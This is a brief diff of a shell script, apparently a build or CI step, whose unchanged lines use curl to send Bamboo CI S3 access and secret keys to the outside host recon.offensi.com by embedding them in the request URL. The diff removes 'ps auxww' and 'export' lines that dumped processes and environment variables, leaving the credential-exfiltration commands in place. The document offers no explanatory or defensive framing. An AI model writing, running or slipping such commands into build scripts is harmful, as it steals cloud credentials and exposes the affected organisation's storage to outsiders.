@@ -9,6 +9,4 @@ curl http://recon.offensi.com/`echo markets3:$bamboo_market_s3_access_key_passwo
 curl http://recon.offensi.com/`echo markets3:$bamboo_market_s3_secret_key_password`
 
 
-ps auxww
-export
 exit 1
